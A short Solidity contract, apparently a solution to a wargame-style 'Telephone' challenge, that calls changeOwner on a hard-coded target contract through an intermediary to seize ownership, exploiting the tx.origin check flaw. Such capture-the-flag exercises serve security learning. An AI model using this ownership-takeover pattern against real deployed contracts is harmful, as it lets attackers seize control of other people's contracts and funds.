// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ITelephone.sol";
import "hardhat/console.sol";

contract TelephoneAttack {
    ITelephone telephone =
        ITelephone(0x06d525c1000c37fB6b12bbE411fa3cccBF7b848d);

    function attack(address _address) public {
        console.log("Telephone Attack", msg.sender);
        telephone.changeOwner(_address);
    }
}
